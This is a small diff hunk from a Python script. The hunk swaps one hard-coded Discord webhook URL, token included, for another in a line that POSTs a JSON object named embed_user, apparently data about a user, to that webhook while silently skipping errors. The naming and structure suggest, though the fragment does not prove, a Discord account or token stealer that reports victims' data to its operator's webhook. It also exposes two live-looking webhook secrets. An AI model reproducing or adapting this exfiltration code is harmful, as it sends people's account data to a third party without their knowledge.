@@ -259,7 +259,7 @@ def main():
                     "username": "Dc"
                 }
 
-                urllib.request.urlopen(urllib.request.Request('https://discord.com/api/webhooks/1469705536479039528/_o829DUyXllIuHQWmaRXBvZ2C06CSHTPVFQuG33OcUtycRPtxuCdhTiTz44cvFAKhjzR', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
+                urllib.request.urlopen(urllib.request.Request('https://discord.com/api/webhooks/1474938108054077561/MUL-hcH4AX__ToNQ6ZyCKnQYKwfTwawA6TjIuVAU-7H_DXoiLgLtUkMUc9lqjBTfOOLt', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
             except urllib.error.HTTPError or json.JSONDecodeError:
                 continue
             except Exception as e:
